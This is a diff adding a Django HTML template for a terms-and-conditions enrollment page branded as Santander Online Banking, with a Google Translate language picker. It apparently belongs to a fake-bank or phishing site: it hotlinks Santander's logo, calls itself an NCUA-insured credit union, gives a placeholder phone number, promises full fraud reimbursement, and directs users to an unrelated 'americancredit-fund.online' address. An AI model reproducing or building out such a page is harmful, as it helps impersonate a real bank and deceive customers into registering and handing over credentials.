@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en-US" class="js">
+{% load static %}
+{% include "core/translate.html" %}
+
+    <head>
+        <meta charset="utf-8">
+        <meta name="author" content="Smart">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="description" content="This Credit Union is federally insured by the National Credit Union Administration. We do business in accordance with the Fair Housing Law and Equal opportunity Credit Act.">
+        <!-- Fav Icon  -->
+        <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png">
+        <!-- Page Title  -->
+        <title>{{ user.full_name }} |  Online banking</title>
+        <!-- StyleSheets  -->
+        <link rel="stylesheet" href="{% static 'assets/css/dashlite.css' %}">
+        <link rel="stylesheet" href="{% static 'scss/sweetalert.css' %}">
+        <link id="skin-default" rel="stylesheet" href="{% static 'assets/css/theme.css' %}">
+        <link id="skin-default" rel="stylesheet" href="{% static 'assets/css/theme.css' %}">
+        <link href="{% static 'css/toastr.css' %}" rel="stylesheet" />
+   </head>
+
+<style type="text/css">
+    .btn-primary {
+        background-color: #033d75;
+    }
+
+    .btn-secondary {
+        background-color: #d13636;
+    }
+
+    .btn-secondary:hover {
+        opacity: 0.6;
+    }
+
+    .btn-primary:hover {
+        opacity: 0.6;
+    }
+</style>
+<style>
+    input[type=number] {
+        height: 50px;
+        width: 50px;
+        font-size: 25px;
+        color: #033d75;
+        text-align: center;
+        border: 3px solid #033d75;
+        box-shadow: 4px #033d75;
+        border-radius: 7px;
+        font-weight: 600;
+    }
+
+    input[type=number]:focus {
+        border-bottom: 5px solid #008000;
+    }
+
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+
+/* Hide the Google Translate iframe */
+iframe.VIpgJd-ZVi9od-ORHb-OEVmcd {
+    display: none !important;
+}
+
+/* Hide the Google Translate banner */
+.goog-te-banner-frame.skiptranslate {
+    display: none !important;
+}
+    
+</style>
+
+<body class="nk-body npc-crypto bg-white pg-auth">
+    <!-- app body @s -->
+    <div class="nk-app-root">
+        <div class="nk-split nk-split-page nk-split-md">
+            <div class="nk-split-content nk-block-area nk-block-area-column nk-auth-container bg-white">
+                <div class="absolute-top-right d-lg-none p-3 p-sm-5">
+                    <a href="#" class="toggle btn-white btn btn-icon btn-light" data-target="athPromo"><em class="icon ni ni-info"></em></a>
+                </div>
+                <div class="nk-block nk-block-middle nk-auth-body">
+                <div class="nk-feature-conten p-3">
+                    <a href="/"> <img  src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" width="145" class="p-3"></a>
+                </div>
+
+                    <br>
+
+
+                    <div class="nk-block-head">
+                        <div class="nk-block-head-content">
+                            <h3 class="nk-block-title">Enroll a new Account</h3>
+                            <div class="nk-block-des alert alert-pro alert-primary">
+                                <p class="alert-text">Before you continue, Kindly read and accept our terms and conditions.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- .nk-block-head -->
+                    
+                        <h3 style="font-weight:700; color:Purple;">TERMS AND CONDITIONS</h3>
+<div class="scrollable-container">
+    <p >
+        Before you can start using our online service, you must agree to be bound by the conditions below. You must read the conditions before you decide 
+        whether to accept them. If you agree to be bound by these conditions, please click the "I accept" button below. If you click on the "Decline" 
+        button, you will not be able to continue your registration for our online services. We strongly recommend that you print a copy of these 
+        conditions for your reference.
+    </p>
+
+    <h3>1. DEFINITIONS</h3>
+    <p>In these conditions, the following words have the following meanings:</p>
+    <ul>
+        <li><strong>ACCOUNT:</strong> Any account which you hold and access via our online service.</li>
+        <li><strong>ADDITIONAL SECURITY DETAILS:</strong> The additional information you give us to help us identify you, including the additional security question you provide yourself.</li>
+        <li><strong>IDENTITY DETAILS:</strong> The access code we may provide you with.</li>
+        <li><strong>Santander  Online Banking ACCOUNT ID, PASSWORD, and ACCOUNT PIN:</strong> The credentials you choose to identify yourself when you use our online service.</li>
+        <li><strong>YOU, YOUR, and YOURSELF:</strong> Refer to the person who has entered into this agreement with us.</li>
+    </ul>
+
+    <h3>2. USING THE ONLINE SERVICE</h3>
+    <p>
+        a. These conditions apply to your use of our online service and any accounts. They explain the relationship between you and us in relation to our 
+        online service. You should read these conditions carefully to understand how these services work and your and our rights and duties under them. 
+        If there is a conflict between these conditions and your account conditions, these conditions will apply.
+    </p>
+    <p>
+        b. If any of your accounts is a joint account, these conditions apply to all of you together and any of you separately. If more than one of you 
+        uses our online service, you must each choose your own username, password, and additional security details.
+    </p>
+    <p>
+        c. By registering to use our online service, you accept these conditions and agree that we may communicate with you by e-mail or through our website.
+    </p>
+    <p>
+        d. When you use our online service, you must follow the instructions we give you from time to time. You are responsible for ensuring that your 
+        computer, software, and other equipment are capable of being used with our online service.
+    </p>
+    <p>
+        e. Our online sites are secure. Disconnection from the Internet or leaving these sites will not automatically log you off. You must always use 
+        the log-off facility when you are finished and never leave your machine unattended while you are logged in. As a security measure, if you have 
+        not used the sites for more than a specified period of time, we will ask you to log in again.
+    </p>
+
+    <h3>3. WHAT RULES APPLY TO SECURITY?</h3>
+    <p>
+        a. As part of the registration for our online service, you must provide us with identity details before we allow you to use the services for the 
+        first time. You must enter your identity details immediately after signing in so we can identify you.
+    </p>
+    <p>
+        b. Every time you use our online service, you must give us your username, your password, and the answer to an additional security question.
+    </p>
+    <p>
+        c. You can change your username or password online by following the instructions on the screen.
+    </p>
+    <p>
+        d. For administration or security reasons, we can require you to choose a new username or change your password before you use (or carry on using) 
+        our online service.
+    </p>
+    <p>
+        e. You must not write down, store (whether encrypted or otherwise) on your computer, or let anyone else know your password, identity details, or 
+        additional security details, and the fact that they are for use with your accounts.
+    </p>
+    <p>
+        f. If you think someone else knows your password or any of your additional security details or has used any of them to use our online service, 
+        you must do the following:
+    </p>
+    <ul>
+        <li>For your password, change it online as soon as possible. If you have difficulty changing your password, you must phone us on +1 234 567 8910 immediately.</li>
+        <li>For your additional security details, phone us immediately to change them.</li>
+    </ul>
+    <p>
+        g. We may give the police or any prosecuting authority any information they need if we think it will help them find out if someone else is using 
+        your username, password, or any of your additional security details.
+    </p>
+
+    <h3>4. WHAT IS THE EXTENT OF YOUR LIABILITY?</h3>
+    <p>
+        a. If you are a victim of online fraud, we guarantee that you won't lose any money on your accounts and will always be reimbursed in full.
+    </p>
+    <p>
+        b. Unless you are a victim of fraud, you are responsible for all instructions and other information sent using your username, password, or 
+        additional security details.
+    </p>
+
+    <h3>5. HOW WE CAN CHANGE THESE CONDITIONS</h3>
+    <p>
+        a. Santander  Online Banking can change these conditions for any reason by giving you written notice or publishing the change on our website.
+    </p>
+    <p>
+        b. We may send all written notices to you at the last e-mail address you gave us. You must let us know immediately if you change your e-mail 
+        address (you can do so online) to ensure we have your current e-mail address at all times.
+    </p>
+
+    <h3>6. GENERAL</h3>
+    <p>
+        The Santander  Online Banking service is available to you if you are 18 years of age or over.
+    </p>
+</div>
+
+<style>
+    .scrollable-container {
+        --scrollbar-width: 12px;
+        --scrollbar-color: #6e7781;
+        --scrollbar-bg: #f0f0f0;
+        --scrollbar-hover-color: #4a4f54;
+        --border-color: #ced4da;
+        --focus-color: #80bdff;
+        --bg-color: #fdfdfd;
+        --text-color: #333;
+        --shadow-color: rgba(0, 0, 0, 0.12);
+
+        width: 100%;
+        max-height: 300px;
+        padding: 1rem;
+        border: 2px solid var(--border-color);
+        border-radius: 8px;
+        background-color: var(--bg-color);
+        overflow-y: auto;
+        font-size: 1rem;
+        text-align: left;
+        line-height: 1.6;
+        white-space: pre-wrap;
+        word-wrap: break-word;
+        box-shadow: inset 0 2px 4px var(--shadow-color);
+        margin-top: 1.25rem;
+        transition: all 0.3s ease;
+        color: var(--text-color);
+
+        /* Firefox scrollbar styles */
+        scrollbar-width: thin;
+        scrollbar-color: var(--scrollbar-color) var(--scrollbar-bg);
+    }
+
+    /* WebKit scrollbar styles */
+    .scrollable-container::-webkit-scrollbar {
+        width: var(--scrollbar-width);
+    }
+
+    .scrollable-container::-webkit-scrollbar-track {
+        background: var(--scrollbar-bg);
+        border-radius: calc(var(--scrollbar-width) / 2);
+    }
+
+    .scrollable-container::-webkit-scrollbar-thumb {
+        background-color: var(--scrollbar-color);
+        border-radius: calc(var(--scrollbar-width) / 2);
+        border: 3px solid var(--scrollbar-bg);
+        transition: background-color 0.3s ease;
+    }
+
+    .scrollable-container::-webkit-scrollbar-thumb:hover {
+        background-color: var(--scrollbar-hover-color);
+    }
+
+    /* Scrollbar corner */
+    .scrollable-container::-webkit-scrollbar-corner {
+        background-color: var(--scrollbar-bg);
+    }
+
+    /* Focus effect */
+    .scrollable-container:focus {
+        outline: none;
+        border-color: var(--focus-color);
+        box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25), inset 0 2px 4px var(--shadow-color);
+    }
+
+    /* Hover effect */
+    .scrollable-container:hover {
+        border-color: #adb5bd;
+    }
+
+    /* Dark mode support */
+    @media (prefers-color-scheme: dark) {
+        .scrollable-container {
+            --scrollbar-color: #959da5;
+            --scrollbar-bg: #2a2a2a;
+            --scrollbar-hover-color: #bbb;
+            --border-color: #4a4a4a;
+            --focus-color: #4d90fe;
+            --bg-color: #1e1e1e;
+            --text-color: #e0e0e0;
+            --shadow-color: rgba(0, 0, 0, 0.3);
+        }
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+        .scrollable-container {
+            max-height: 200px;
+            padding: 0.75rem;
+            font-size: 0.875rem;
+            --scrollbar-width: 10px;
+        }
+    }
+
+    /* Accessibility: Remove animations for users who prefer reduced motion */
+    @media (prefers-reduced-motion: reduce) {
+        .scrollable-container,
+        .scrollable-container::-webkit-scrollbar-thumb {
+            transition: none;
+        }
+    }
+
+    /* Print styles */
+    @media print {
+        .scrollable-container {
+            max-height: none;
+            overflow: visible;
+            border: none;
+            box-shadow: none;
+        }
+    }
+
+
+</style>
+
+                        <br><br>
+                        <a href="{% url 'home' %}" style="color:white;"><button id="btn1" class="btn btn-secondary">Decline</button></a>&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;
+                        <a href="{% url 'accounts:register' %}" style="color:white;"><button id="btn1" class="btn btn-primary">I Accept</button></a>
+                   
+                    <!-- form -->
+
+                </div>
+                <!-- .nk-block -->
+
+                                                                                
+                                            <style>
+                                                /* 🔥 Unique Styling for Custom Language Selector */
+                                                .custom-translate-container {
+                                                    display: flex;
+                                                    align-items: center;
+                                                    gap: 10px;
+                                                    padding: 6px 12px;
+                                                    border: 1px solid #ddd;
+                                                    border-radius: 6px;
+                                                    background: #ffffff;
+                                                    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+                                                    font-family: 'Arial', sans-serif;
+                                                    max-width: 300px;
+                                                    cursor: pointer;
+                                                    left: 50px;
+                                                }
+
+                                                .custom-translate-container label {
+                                                    font-size: 14px;
+                                                    font-weight: bold;
+                                                    color: #333;
+                                                }
+
+                                                /* Hide Google’s original UI */
+                                                #custom_google_translate {
+                                                    display: none;
+                                                }
+
+                                                /* Custom dropdown style */
+                                                .custom-language-selector {
+                                                    width: 100%;
+                                                    padding: 8px;
+                                                    font-size: 14px;
+                                                    border: none;
+                                                    border-radius: 5px;
+                                                    background: #f5f5f5;
+                                                    cursor: pointer;
+                                                    outline: none;
+                                                    transition: all 0.3s ease-in-out;
+                                                }
+
+                                                .custom-language-selector:hover {
+                                                    background: #eaeaea;
+                                                }
+
+                                                /* Dropdown Arrow Customization */
+                                                .custom-language-wrapper {
+                                                    position: relative;
+                                                    width: 100%;
+                                                }
+
+                                                .custom-language-wrapper::after {
+                                                    content: "▼";
+                                                    font-size: 12px;
+                                                    color: #333;
+                                                    position: absolute;
+                                                    right: 10px;
+                                                    top: 50%;
+                                                    transform: translateY(-50%);
+                                                    pointer-events: none;
+                                                }
+                                            </style>
+
+                                            <!-- ✅ Custom Google Translate Logic -->
+                                            <script type="text/javascript">
+                                                function initCustomGoogleTranslate() {
+                                                    if (!document.getElementById('custom_google_translate_script')) {
+                                                        let script = document.createElement('script');
+                                                        script.id = 'custom_google_translate_script';
+                                                        script.type = 'text/javascript';
+
+                                                        script.src = "//translate.google.com/translate_a/element.js?cb=loadCustomTranslate";
+                                                        document.body.appendChild(script);
+                                                    } else {
+                                                        loadCustomTranslate();
+                                                    }
+                                                }
+
+                                                function loadCustomTranslate() {
+                                                    new google.translate.TranslateElement({ pageLanguage: 'en' }, 'custom_google_translate');
+                                                }
+
+                                                document.addEventListener("DOMContentLoaded", function () {
+                                                    initCustomGoogleTranslate();
+
+                                                    document.getElementById('custom_language_select').addEventListener('change', function () {
+                                                        var lang = this.value;
+                                                        var googleSelect = document.querySelector('.goog-te-combo');
+
+                                                        if (lang === "en-GB" || lang === "en-US") {
+                                                            // 🚀 Reset Google Translate to Original English (Without Reload)
+                                                            document.cookie = "googtrans=/en/en; path=/; domain=" + window.location.hostname;
+                                                            window.location.reload();  // Force reload to apply changes
+                                                        } else if (googleSelect) {
+                                                            googleSelect.value = lang;
+                                                            googleSelect.dispatchEvent(new Event('change')); // Trigger Google Translate
+                                                        }
+                                                    });
+                                                });
+                                            </script>
+                                            <style>
+                                                /* Hide the Google Translate iframe */
+                                                iframe.VIpgJd-ZVi9od-ORHb-OEVmcd {
+                                                    display: none !important;
+                                                }
+
+                                                /* Hide the Google Translate banner */
+                                                .goog-te-banner-frame.skiptranslate {
+                                                    display: none !important;
+                                                }
+
+                                                /* Hide the Google Translate widget */
+                                                body {
+                                                    top: 0px !important;
+                                                }
+                                            </style>
+                                            <!-- ✅ Custom Translation UI -->
+                                            <div class="custom-translate-container">
+                                                <label>🌎 Language:</label>
+                                                <div class="custom-language-wrapper">
+                                            <select id="custom_language_select" class="custom-language-selector">
+                                                <!-- 🌍 Asia (Expanded) -->
+                                                <optgroup label="🌏 Asia">
+                                                    <option value="zh-CN">🇨🇳 Chinese (Simplified)</option>
+                                                    <option value="zh-TW">🇹🇼 Chinese (Traditional)</option>
+                                                    <option value="ja">🇯🇵 Japanese</option>
+                                                    <option value="ko">🇰🇷 Korean</option>
+                                                    <option value="hi">🇮🇳 Hindi</option>
+                                                    <option value="bn">🇧🇩 Bengali</option>
+                                                    <option value="ur">🇵🇰 Urdu</option>
+                                                    <option value="ar">🇦🇪 Arabic</option>
+                                                    <option value="th">🇹🇭 Thai</option>
+                                                    <option value="vi">🇻🇳 Vietnamese</option>
+                                                    <option value="ms">🇲🇾 Malay</option>
+                                                    <option value="id">🇮🇩 Indonesian</option>
+                                                    <option value="tl">🇵🇭 Filipino/Tagalog</option>
+                                                    <option value="km">🇰🇭 Khmer</option>
+                                                    <option value="my">🇲🇲 Burmese</option>
+                                                    <option value="ne">🇳🇵 Nepali</option>
+                                                    <option value="si">🇱🇰 Sinhala</option>
+                                                    <option value="fa">🇮🇷 Persian/Farsi</option>
+                                                </optgroup>
+
+                                                <!-- 🌍 Europe -->
+                                                <optgroup label="🇪🇺 Europe">
+                                                    <option value="en-GB">🇬🇧 English (UK)</option>
+                                                    <option value="de">🇩🇪 German</option>
+                                                    <option value="fr">🇫🇷 French</option>
+                                                    <option value="es">🇪🇸 Spanish</option>
+                                                    <option value="it">🇮🇹 Italian</option>
+                                                    <option value="ru">🇷🇺 Russian</option>
+                                                    <option value="nl">🇳🇱 Dutch</option>
+                                                    <option value="sv">🇸🇪 Swedish</option>
+                                                    <option value="no">🇳🇴 Norwegian</option>
+                                                    <option value="da">🇩🇰 Danish</option>
+                                                    <option value="fi">🇫🇮 Finnish</option>
+                                                    <option value="pl">🇵🇱 Polish</option>
+                                                    <option value="uk">🇺🇦 Ukrainian</option>
+                                                    <option value="cs">🇨🇿 Czech</option>
+                                                    <option value="hu">🇭🇺 Hungarian</option>
+                                                    <option value="el">🇬🇷 Greek</option>
+                                                    <option value="tr">🇹🇷 Turkish</option>
+                                                    <option value="pt">🇵🇹 Portuguese</option>
+                                                    <option value="ro">🇷🇴 Romanian</option>
+                                                    <option value="bg">🇧🇬 Bulgarian</option>
+                                                </optgroup>
+
+                                                <!-- 🌍 Africa -->
+                                                <optgroup label="🌍 Africa">
+                                                    <option value="sw">🇰🇪 Swahili</option>
+                                                    <option value="zu">🇿🇦 Zulu</option>
+
+                                                    <option value="am">🇪🇹 Amharic</option>
+                                                    <option value="so">🇸🇴 Somali</option>
+                                                    <option value="mg">🇲🇬 Malagasy</option>
+                                                    <option value="af">🇿🇦 Afrikaans</option>
+                                                </optgroup>
+
+                                                <!-- 🌍 North America -->
+                                                <optgroup label="🌎 North America">
+                                                    <option value="en-US">🇺🇸 English (US)</option>
+                                                    <option value="fr-CA">🇨🇦 French (Canadian)</option>
+                                                    <option value="es-MX">🇲🇽 Spanish (Mexican)</option>
+                                                    <option value="haw">🇺🇸 Hawaiian</option>
+                                                    <option value="nv">🇺🇸 Navajo</option>
+                                                </optgroup>
+
+                                                <!-- 🌍 South America -->
+                                                <optgroup label="🌎 South America">
+                                                    <option value="pt-BR">🇧🇷 Portuguese (Brazilian)</option>
+                                                    <option value="es-AR">🇦🇷 Spanish (Argentinian)</option>
+                                                    <option value="qu">🇵🇪 Quechua</option>
+                                                    <option value="ay">🇧🇴 Aymara</option>
+                                                    <option value="gn">🇵🇾 Guarani</option>
+                                                </optgroup>
+
+                                                <!-- 🌍 Oceania -->
+                                                <optgroup label="🌏 Oceania">
+                                                    <option value="en-AU">🇦🇺 English (Australian)</option>
+                                                    <option value="en-NZ">🇳🇿 English (New Zealand)</option>
+                                                    <option value="mi">🇳🇿 Māori</option>
+                                                    <option value="sm">🇼🇸 Samoan</option>
+                                                    <option value="to">🇹🇴 Tongan</option>
+                                                    <option value="fj">🇫🇯 Fijian</option>
+                                                </optgroup>
+                                            </select>
+                                                </div>
+                                            </div>
+
+                                            <!-- ✅ Hidden Google Translate Instance -->
+                                            <div id="custom_google_translate"></div>
+                <div class="nk-block nk-auth-footer">
+                    <a href="#" style="">
+        <div style="color: white; background-color: " id="google_translate_element2"></div>
+                    </a>
+                    <div class="mt-3">
+                        <p>&copy; 2025 Santander  Online Banking . All Rights Reserved.</p>
+                    </div>
+                </div>
+                <!-- .nk-block -->
+            </div>
+            <!-- .nk-split-content -->
+            <div class="nk-split-content nk-split-stretch bg-lighter d-flex toggle-break-lg toggle-slide toggle-slide-right" data-content="athPromo" data-toggle-screen="lg" data-toggle-overlay="true">
+                <div class="slider-wrap w-100 w-max-550px p-3 p-sm-5 m-auto">
+                    <div class="slider-init" data-slick='{"dots":true, "arrows":false}'>
+                        <div class="slider-item">
+                            <div class="nk-feature nk-feature-center">
+                                <div class="nk-feature-img">
+                                    <img style="width: 140px;" class="round" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" alt="">
+                                </div>
+                                <div class="nk-feature-content py-4 p-sm-5">
+                                    <h4>Protect your online banking.</h4>
+                                    <p>We have security measures in place to safeguard your money, because we are committed to providing you with a secure banking experience. When we come across any hoaxes or scams that target customers, we will raise them
+                                        to your attention.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- .slider-item -->
+                        <div class="slider-item">
+                            <div class="nk-feature nk-feature-center">
+                                <div class="nk-feature-img">
+                                    <img style="width: 140px;" class="round" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" alt="">
+                                </div>
+                                <div class="nk-feature-content py-4 p-sm-5">
+                                    <h4>Santander  Online Banking </h4>
+                                    <p>We'll never send an email containing a link to Santander  Online Banking .<br> We'll never ask for your passwords or Secret Code.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- .slider-item -->
+                        <div class="slider-item">
+                            <div class="nk-feature nk-feature-center">
+                                <div class="nk-feature-img">
+                                    <img style="width: 140px;" class="round" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" srcset="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/2560px-Banco_Santander_Logotipo.svg.png" alt="">
+                                </div>
+                                <div class="nk-feature-content py-4 p-sm-5">
+                                    <h4>Santander  Online Banking </h4>
+                                    <p>When accessing Santander  Online Banking, always open a new browser window and type support@americancredit-fund.online</p>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- .slider-item -->
+                    </div>
+                    <!-- .slider-init -->
+                    <div class="slider-dots"></div>
+                    <div class="slider-arrows"></div>
+                </div>
+                <!-- .slider-wrap -->
+            </div>
+            <!-- .nk-split-content -->
+        </div>
+        <!-- .nk-split -->
+    </div>
+    <!-- app body @e -->
+    <!-- JavaScript -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script src="{% static 'assets/js/country.js' %}"></script>
+    <script src="{% static 'assets/js/bundle.js' %}"></script>
+    <script src="{% static 'assets/js/scripts.js' %}"></script>
+    <script src="{% static 'assets/js/charts/chart-crypto.js' %}"></script>
+    <script src="{% static 'assets/js/sweetalert.js' %}"></script>
+   <script src="{% static 'assets/js/jquery.min.js' %}"></script>
+   <script src="{% static 'assets/js/custom.js' %}"></script>
+   <script src="{% static 'assets/js/toastr.js' %}"></script>
+</body>
+
+</html>
